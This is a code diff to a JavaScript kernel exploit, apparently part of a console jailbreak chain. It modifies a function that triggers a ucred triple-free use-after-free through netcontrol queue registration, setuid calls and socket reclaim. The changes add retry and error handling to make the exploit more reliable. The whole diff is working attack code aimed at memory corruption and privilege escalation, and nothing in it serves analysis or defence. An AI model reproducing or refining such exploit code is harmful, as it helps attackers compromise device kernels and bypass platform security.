@@ -1466,15 +1466,25 @@ function trigger_ucred_triplefree() {
 
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (dummy_socket.eq(BigInt_Error)) {
+      log("[TRIGGER] dummy_socket error, retry");
+      continue;
+    }
+
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
     nc_call(NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-    close(new BigInt(dummy_socket));
+    close(dummy_socket); // مفيش داعي new BigInt هنا
 
     // 2) allocate new ucred
     setuid(1);
 
     // 3) reclaim fd → uaf_socket
-    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
+    var tmp_sock = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (tmp_sock.eq(BigInt_Error)) {
+      log("[TRIGGER] uaf_socket error, retry");
+      continue;
+    }
+    uaf_socket = Number(tmp_sock.and(0xFFFFFFFF));
 
     // 4) free previous ucred
     setuid(1);
@@ -1482,7 +1492,7 @@ function trigger_ucred_triplefree() {
     // 5) unregister → free file + ucred
     write32(nc_clear_buf, uaf_socket);
     nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
-
+    
     // 6) refcount fix loop
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
